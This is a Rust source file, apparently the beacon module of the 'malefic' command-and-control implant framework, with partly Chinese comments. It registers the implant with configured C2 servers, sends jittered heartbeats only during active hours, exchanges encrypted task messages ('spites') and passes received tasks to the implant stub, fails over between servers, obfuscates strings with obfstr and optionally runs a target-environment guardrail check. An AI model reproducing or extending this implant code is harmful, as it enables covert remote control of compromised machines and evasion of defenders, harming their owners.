use futures_timer::Delay;
use futures::{SinkExt, StreamExt};
use std::time::Duration;
use crate::malefic::MaleficChannel;
use crate::stub::MaleficStub;
#[cfg(feature = "guardrail")]
use crate::guardrail::Guardrail;

use malefic_core::config;
use malefic_core::transport::{Client, DialerExt, ServerManager};
use malefic_helper::debug;
use malefic_proto::crypto::new_cryptor;
use malefic_proto::marshal_one;
use obfstr::obfstr;
pub struct MaleficBeacon {
    stub: MaleficStub,
    client: Client,
    server_manager: ServerManager,
}

impl MaleficBeacon {
    pub fn new(instance_id: [u8; 4], channel: MaleficChannel) -> Result<Self, Box<dyn std::error::Error>> {
        let stub = MaleficStub::new(instance_id, channel);
        let iv: Vec<u8> = config::KEY.to_vec().iter().rev().cloned().collect();

        let client = Client::new(new_cryptor(config::KEY.to_vec(), iv))
            .map_err(|e| {
                debug!("[beacon] Failed to initialize client: {}", e);
                e
            })?;
        let server_manager = ServerManager::new(config::SERVER_CONFIGS.clone(), None);

        Ok(MaleficBeacon {
            client,
            stub,
            server_manager,
        })
    }

    pub async fn run(&mut self) -> Result<(), ()> {
        #[cfg(debug_assertions)]
        let _defer = malefic_helper::Defer::new(obfstr!("[beacon] beacon exit!"));

        // initial registr
        if !self.init().await {
            debug!("[beacon] Failed to init");
            return Err(());
        }

        // 正常通信阶段
        let mut global_retry_count = 0;
        loop {
            // 检查是否在活跃时间
            if !self.stub.meta.is_active_now() {
                let sleep_time = Duration::from_millis(self.stub.meta.new_heartbeat());
                Delay::new(sleep_time).await;
                continue;
            }

            // 计算心跳间隔
            let sleep_time = Duration::from_millis(self.stub.meta.new_heartbeat());
            debug!("[beacon] Next heartbeat : {:?}", sleep_time);
            Delay::new(sleep_time).await;

            // 
            match self.handle_heartbeat().await {
                Ok(()) => {
                    global_retry_count = 0;
                }
                Err(()) => {
                    global_retry_count += 1;
                    debug!("[beacon] Heartbeat failed : {}/{}", global_retry_count, self.server_manager.max_global_retry);

                    if self.server_manager.has_registered {
                        if global_retry_count >= self.server_manager.max_global_retry {
                            global_retry_count = 0;
                        }
                    } else {
                        debug!("[beacon] No server available.");
                        return Err(());
                    }
                }
            }

        }
    }

    /// 初始注册阶段：按优先级顺序尝试注册到服务器
    async fn init(&mut self) -> bool {
        let attempts_per_server = ServerManager::INITIAL_REGISTRATION_ATTEMPTS as usize;

        if self.server_manager.servers.is_empty() {
            debug!("[beacon] No server configured for init.");
            return false;
        }
        for idx in 0..self.server_manager.servers.len() {
            self.server_manager.current_index = idx;

            for attempt in 0..attempts_per_server {
                match self.register().await {
                    Ok(()) => {
                        self.server_manager.mark_register();
                        debug!("[beacon] Init register success");
                        return true;
                    }
                    Err(_) => {
                        self.server_manager.mark_failure();

                        if attempt + 1 >= attempts_per_server {
                            break;
                        }
                    }
                }

                if !self.stub.meta.is_active_now() {
                    let sleep_time = Duration::from_millis(self.stub.meta.new_heartbeat_without_jitter());
                    Delay::new(sleep_time).await;
                } else {
                    let sleep_time = Duration::from_millis(self.stub.meta.new_heartbeat());
                    Delay::new(sleep_time).await;
                }
            }

            if !self.server_manager.switch_to_next() {
                debug!("[beacon] No server available for init.");
                break;
            }
        }

        debug!("[beacon] No server available for init.");
        false
    }

    /// 
    async fn handle_heartbeat(&mut self) -> Result<(), ()> {
        let max_attempts = 5; 
        
        for _ in 1..=max_attempts {
            if let Some(_url) = self.server_manager.current_address().map(|s| s.to_string()) {
                if !self.server_manager.is_registered() {
                    debug!("[beacon] Server {} not registered, register first", _url);
                    match self.register().await {
                        Ok(()) => {
                            self.server_manager.mark_register();
                            debug!("[beacon] Re-registration successful: {}", _url);
                        }
                        Err(_e) => {
                            debug!("[beacon] Re-registration failed with server {}: {:?}", _url, _e);
                            self.handle_communication_failure();
                            continue;
                        }
                    }
                }

                // 执行数据交换
                match self.data_exchange().await {
                    Ok(()) => {
                        self.server_manager.mark_success();
                        debug!("[beacon] Data exchange success : {}", _url);
                        return Ok(());
                    }
                    Err(_e) => {
                        debug!("[beacon] Data exchange failed : {:?}", _e);
                        self.handle_communication_failure();
                    }
                }
            } else {
                debug!("[beacon] No server URL available.");
                break;
            }
        }
        
        debug!("[beacon] Heartbeat failed after {} attempts", max_attempts);
        Err(())
    }

    ///
    async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // check guardrail
        #[cfg(feature = "guardrail")]
        {
            Guardrail::check(self.stub.get_sysinfo());
        }

        let server_config = self.server_manager.current_server_config().ok_or(obfstr!(""))?;
        debug!("[beacon] Current Server: {:#?}", server_config);
        // 建立连接
        let transport = self.client.connect(&server_config).await
            .map_err(|e| {
                let error_msg = obfstr!("Failed to connect:").to_string() + &e.to_string();
                error_msg
            })?;

        // 准备注册数据
        let data = marshal_one(self.stub.meta.get_uuid(), self.stub.register_spite(),self.stub.meta.get_encrypt_key())
            .map_err(|e| {
                let error_msg = obfstr!("Failed to marshal registration data: ").to_string() + &e.to_string();
                error_msg
            })?;

        // 发送注册数据
        match self.client.handler(transport, data).await {
            Ok(Some(_spite_data)) => {
                debug!("[beacon] Registered (recived data)");
                Ok(())
            }
            Ok(None) => {
                debug!("[beacon] Registered (no data)");
                Ok(())
            }
            Err(e) => {
                Err(format!("Registration failed: {:?}", e).into())
            }
        }
    }

    /// 尝试数据交换
    async fn data_exchange(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let server_config = self.server_manager.current_server_config().ok_or(obfstr!(""))?;

        // 建立连接
        let transport = match self.client.connect(&server_config).await {
            Ok(t) => t,
            Err(e) => {
                return Err(format!("Failed to connect: {:?}", e).into());
            }
        };

        // 使用自定义的数据交换逻辑来准确检测服务器状态
        match self.process_data(transport).await {
            Ok(true) => {
                debug!("[beacon] Data exchange completed (has resp)");
                Ok(())
            }
            Ok(false) => {
                debug!("[beacon] Data exchange completed (no resp)");
                Ok(())
            }
            Err(e) => {
                Err(e)
            }
        }
    }

    /// 执行数据交换并验证服务器响应
    async fn process_data(&mut self, transport: malefic_core::transport::InnterTransport) -> Result<bool, Box<dyn std::error::Error>> {
        self.stub.channel.request_sender.send(true).await
            .map_err(|e| format!("Failed to send request: {:?}", e))?;

        let spites = if let Some(data) = self.stub.channel.response_receiver.next().await {
            data
        } else {
            malefic_proto::proto::implantpb::Spites { spites: vec![] }
        };

        #[cfg(debug_assertions)]
        {
            if malefic_proto::get_message_len(&spites) <= 2048 {
                println!("{:#?}", spites);
            } else {
                println!("length: {}", spites.spites.len());
            }
        }

        let marshaled = malefic_proto::marshal(self.stub.meta.get_uuid(), spites.clone(),self.stub.meta.get_encrypt_key())
            .map_err(|e| format!("Failed to marshal data: {:?}", e))?;

        match self.client.handler(transport, marshaled).await {
            Ok(Some(spite_data)) => {
                let received_spites = spite_data.parse(self.stub.meta.get_encrypt_key())
                    .map_err(|e| format!("Failed to parse response: {:?}", e))?;

                self.stub.handler(received_spites).await
                    .map_err(|e| format!("Failed to handle response: {:?}", e))?;

                debug!("[beacon] Received and processed valid response data");
                Ok(true)
            }
            Ok(None) => {
                debug!("[beacon] Connection successful but no data received from server");
                Ok(true)
            }
            Err(e) => {
                let error_msg = format!("{:?}", e);

                for spite in spites.spites {
                    self.stub.push(spite).await
                        .map_err(|e| format!("Failed to recover spite: {:?}", e))?;
                }

                if error_msg.contains("Connection failed") ||
                    error_msg.contains("ConnectionRefused") ||
                    error_msg.contains("Connection reset") {
                    debug!("[beacon] Server connection issue detected");
                    Ok(false)
                } else {
                    Err(format!("Handler failed: {:?}", e).into())
                }
            }
        }
    }

    /// 处理通信失败
    fn handle_communication_failure(&mut self) {
        self.server_manager.mark_failure();
        
        if !self.server_manager.retry_current() {
            if self.server_manager.switch_to_next() {
                debug!("[beacon] Switched to next");
            } else {
                debug!("[beacon] No server available");
            }
        }
    } 
}
